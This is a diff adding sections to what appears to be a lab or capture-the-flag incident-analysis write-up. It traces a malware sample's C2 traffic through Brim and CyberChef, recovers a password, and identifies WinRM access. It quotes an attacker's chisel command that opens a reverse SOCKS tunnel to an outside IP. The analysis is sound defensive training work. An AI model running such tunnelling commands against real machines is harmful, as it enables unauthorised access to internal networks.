@@ -127,7 +127,62 @@ I also identified the URL used by the binary to get the command to be executed a
 > <img width="431" height="215" alt="26" src="https://github.com/user-attachments/assets/41b36c15-22f9-4668-b2e0-b7ddc8d9006e" />
 > <img width="995" height="234" alt="27" src="https://github.com/user-attachments/assets/40438b8f-6808-4005-be44-4c38ae48a3df" />
 
+> Finally for this section, identified the programming language used by the attacker to compile the binary to be "nim" based on the user agent.
+>
+> <img width="501" height="229" alt="28" src="https://github.com/user-attachments/assets/e67b53a3-ab56-41de-9ac4-7b674de21ce5" />
+
+*** Disocvery - Internal Reconnaissance ***
+
+> For this section, i had to answer a few questions related to the malicious binary continuously using the C2 traffic based on the collected findings. For the first question i had
+to figure out the password discovered on a sensitive file the attacker located inside the machine of the user. To figure this out i used the Brim filter:
+_path=="http" "<resolvecyber.xyz>" id.resp_p==<80 | cut ts, host, id.resp_p, uri | sort ts
+After gathering the selected base64 string and running it in CyberChef i was able to retrieve the password "infernotempest."
+>
+> <img width="1232" height="739" alt="29" src="https://github.com/user-attachments/assets/da75b3a5-4822-4631-bcf6-775f0fd61db7" />
+> <img width="1661" height="856" alt="30" src="https://github.com/user-attachments/assets/47a54efe-72ab-4413-b75e-12cbb824a59a" />
+> <img width="1041" height="784" alt="31" src="https://github.com/user-attachments/assets/e42a83a5-df8f-4e03-96eb-d40d9f879480" />
+
+> I then identifed the port 5985 to be the listening port that could provide a remote shell inside the machine. Which is a port that the attacker enumerated inside the machine.
+>
+> <img width="1235" height="730" alt="32" src="https://github.com/user-attachments/assets/7e6741cf-6db5-4487-aa40-d1580fe95457" />
+> <img width="1154" height="398" alt="33" src="https://github.com/user-attachments/assets/c62ca504-2867-441b-a509-9f19b7ca745b" />
+> <img width="989" height="787" alt="34" src="https://github.com/user-attachments/assets/e5c2cde0-644d-440c-aaec-0bd197f71cbe" />
+
+> Moving on i then identified the command executed by the attacker to establish the connection to a reverse socks proxy to access the internal services hosted inside the machine to
+be:
+C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+>
+> <img width="1298" height="478" alt="35" src="https://github.com/user-attachments/assets/e1c9b7b9-d81a-4f23-9328-98f762e9b2b1" />
+
+> The SHA256 hash of the binary used by the attacker to establish the reverse proxy connection was identified to be
+"8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451."
+>
+> <img width="1290" height="554" alt="36" src="https://github.com/user-attachments/assets/9fb65a93-3a74-4e59-811c-8f7ed50a233f" />
+
+> I then used VirusTotal to retrieve the name of the tool used by the attacker. I inputted the SHA256 i discovered for the binary into the input field, which returned the tool name:
+chisel
+>
+> <img width="1044" height="738" alt="37" src="https://github.com/user-attachments/assets/6cf39109-e764-43df-92e2-b5c66b2146bf" />
+> <img width="734" height="506" alt="38" src="https://github.com/user-attachments/assets/cc324ce2-8cb2-4179-9cb6-6b21680de8ad" />
+
+> The attacker then used "WinRM" service to authenticate. This was based on outside research using ChatGPT.
+>
+> <img width="945" height="461" alt="39" src="https://github.com/user-attachments/assets/e054580d-a455-4b22-ad65-9f8a583fdbd6" />
+
+*** Privilege Escalation - Exploiting Privileges ***
+
 > 
+
+
+
+
+
+
+
+
+
+
+
 
 
 
